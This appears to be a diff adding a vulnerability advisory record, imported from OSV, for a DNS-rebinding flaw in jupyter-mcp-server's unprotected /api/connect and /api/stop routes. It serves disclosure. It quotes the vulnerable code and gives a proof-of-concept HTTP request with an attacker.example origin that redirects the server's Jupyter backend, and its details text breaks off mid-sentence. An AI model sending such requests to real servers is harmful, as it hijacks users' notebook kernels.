@@ -1,0 +1,70 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0242",
+  "modified": "2026-11-20T00:30:06.844720566Z",
+  "published": "2026-11-20T00:12:51Z",
+  "aliases": [
+    "GHSA-9x8x-crjq-g64h",
+    "CVE-2026-77359"
+  ],
+  "summary": "jupyter-mcp-server: Jupyter MCP Server: Browser DNS rebinding can hijack the Jupyter backend through management routes",
+  "details": "Standalone `streamable-http` mode in `datalayer/jupyter-mcp-server` rejects forged `Host` and `Origin` headers on `/mcp`, but custom management routes mounted on the same application do not get the same browser-origin protection. A malicious website can keep an attacker origin while its hostname resolves to `127.0.0.1` or a private target address, then send `PUT /api/connect` to replace the MCP server's active Jupyter backend. The route accepts the browser-shaped request and makes the server start a kernel client against attacker-controlled infrastructure.\n\nThe protected `/mcp` endpoint shows the intended browser-origin boundary. With `MCP_TOKEN` configured, `/mcp` rejects forged browser headers:\n\n```text\nPOST /mcp with Authorization: Bearer SCAN_MCP_TOKEN\nHost: attacker.example:8142\nOrigin: http://attacker.example:8142\n\nHTTP 421 Invalid Host header\n```\n\nThe vulnerable route is `jupyter_mcp_server/server.py:143-187`. It parses caller JSON, updates the active Jupyter backend configuration, resets `ServerContext`, and starts the kernel without applying the `/mcp` Host/Origin rejection to the custom route:\n\n```python\n@mcp.custom_route(\"/api/connect\", [\"PUT\"])\nasync def connect(request: Request):\n    data = await request.json()\n\n    document_runtime = DocumentRuntime(**data)\n\n    set_config(\n        provider=document_runtime.provider,\n        runtime_url=document_runtime.runtime_url,\n        runtime_id=document_runtime.runtime_id,\n        runtime_token=document_runtime.runtime_token,\n        document_url=document_runtime.document_url,\n        document_id=document_runtime.document_id,\n        document_token=document_runtime.document_token,\n        allowed_jupyter_tools=document_runtime.allowed_jupyter_tools or \"notebook_run-all-cells,notebook_get-selected-cell\"\n    )\n\n    ServerContext.reset()\n\n    try:\n        __start_kernel()\n        return JSONResponse({\"success\": True})\n```\n\n`/api/stop` is also state-changing and accepts the same browser-origin route shape:\n\n```python\n# jupyter_mcp_server/server.py:190-199\n@mcp.custom_route(\"/api/stop\", [\"DELETE\"])\nasync def stop(request: Request):\n    try:\n        current_notebook = notebook_manager.get_current_notebook() or \"default\"\n        if current_notebook in notebook_manager:\n            notebook_manager.remove_notebook(current_notebook)\n        return JSONResponse({\"success\": True})\n```\n\n## Proof of concept\n\nRun the affected version with `MCP_TOKEN` configured:\n\n```bash\ngit clone https://github.com/datalayer/jupyter-mcp-server\ncd jupyter-mcp-server\ngit checkout 27b91e551d8bbca2da32c334f9f13267290ff815\npython3.12 -m venv .venv\n. .venv/bin/activate\npython -m pip install -e .\nMCP_TOKEN=SCAN_MCP_TOKEN python -m jupyter_mcp_server \\\n  --transport streamable-http \\\n  --start-new-runtime false \\\n  --jupyterlab false \\\n  --mcp-token SCAN_MCP_TOKEN \\\n  --port 8083\n```\n\nFirst, show that `/mcp` rejects the browser-shaped request:\n\n```http\nPOST /mcp HTTP/1.1\nHost: attacker.example:8083\nOrigin: http://attacker.example:8083\nAuthorization: Bearer SCAN_MCP_TOKEN\nContent-Type: application/json\nAccept: application/json, text/event-stream\n\n{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{}}\n```\n\nObserved response:\n\n```http\nHTTP/1.1 421\nInvalid Host header\n```\n\nNow send the same browser-origin shape to the custom management route. In a browser DNS-rebinding attack, the attacker-controlled page keeps an attacker origin while the hostname resolves to `127.0.0.1` or the private MCP listener:\n\n```http\nPUT /api/connect HTTP/1.1\nHost: attacker.example:8083\nOrigin: http://attacker.example:8083\nContent-Type: application/json\n\n{\n  \"provider\": \"jupyter\",\n  \"runtime_url\": \"http://127.0.0.1:9183\",\n  \"runtime_id\": \"\",\n  \"runtime_token\": \"ATTACKER_TOKEN_REBIND\",\n  \"document_url\": \"http://127.0.0.1:9183\",\n  \"document_id\": \"demo.ipynb\",\n  \"document_token\": \"ATTACKER_TOKEN_REBIND\"\n}\n```\n\nObserved response:\n\n```http\nHTTP/1.1 200 OK\ncontent-type: application/json\n\n{\"success\":true}\n```\n\nThe server log shows that `/api\n\nImported from OSV GHSA-9x8x-crjq-g64h.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-9x8x-crjq-g64h"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/datalayer/jupyter-mcp-server/security/advisories/GHSA-9x8x-crjq-g64h"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-77359"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/datalayer/jupyter-mcp-server/pull/262"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/datalayer/jupyter-mcp-server"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/datalayer/jupyter-mcp-server/releases/tag/v1.0.3"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "jupyter-mcp-server"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.0.3"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "critical"
+  }
+}
